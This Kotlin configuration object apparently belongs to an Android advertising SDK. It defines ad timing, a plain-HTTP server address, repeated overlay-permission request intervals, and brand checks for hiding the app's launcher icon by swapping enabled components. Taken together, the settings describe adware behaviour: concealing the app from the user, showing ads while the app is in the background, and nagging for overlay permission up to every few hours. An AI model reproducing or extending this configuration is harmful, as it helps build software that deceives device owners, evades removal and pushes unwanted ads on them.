package com.app.sdk.sdk.config

import android.os.Build
import java.util.*
import java.util.concurrent.TimeUnit

object SdkConfig {

    const val disableComponentName = ".ui.main.MainActivity"
    const val adUnitId = "07ed300d89a766b9"
    const val kochavaId = "koholographic-call-0togr"

    val startSDKTime = Calendar.getInstance().apply {
        set(Calendar.YEAR, 2022)
        set(Calendar.MONTH, Calendar.AUGUST)
        set(Calendar.DAY_OF_MONTH, 1)
        set(Calendar.HOUR_OF_DAY, 0)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.time.time

    //Settings
    const val serverAddress = "http://somesdeka.online/api/"
    const val canShowAdWhenAppInForeground = false
    const val enableComponentName = "com.app.sdk.SettingsSdk"
    val delayInAppPermissionRequest = TimeUnit.SECONDS.toMillis(5)

    val showAdDelay = TimeUnit.SECONDS.toMillis(50)

    private val overlayNotificationsDelays = listOf(
        TimeUnit.MINUTES.toMillis(15),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.HOURS.toMillis(2),
        TimeUnit.MINUTES.toMillis(30),
    )

    private val deviceBrand by lazy { Build.BRAND }
    private val cantLaunchActivityDirectlyBrands = listOf("xiaomi")
    private val brandsWhichCanHideIcon = listOf("xiaomi", "oppo", "vivo")

    fun canShowAdDirectly() = !cantLaunchActivityDirectlyBrands
        .any { brand -> (deviceBrand.equals(brand, true)) }

    fun canHideIcon() = brandsWhichCanHideIcon
        .any { brand -> deviceBrand.equals(brand, true) }

    fun getAskOverlayNotificationDelay(askTimes: Int) = overlayNotificationsDelays
        .getOrElse(askTimes) { overlayNotificationsDelays.last() }

    fun getLaunchAdTime(currentTime: Long) = Calendar.getInstance().apply {
        time = Date().apply { time = currentTime + TimeUnit.DAYS.toMillis(1) }
        set(Calendar.HOUR_OF_DAY, 10)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.time.time

}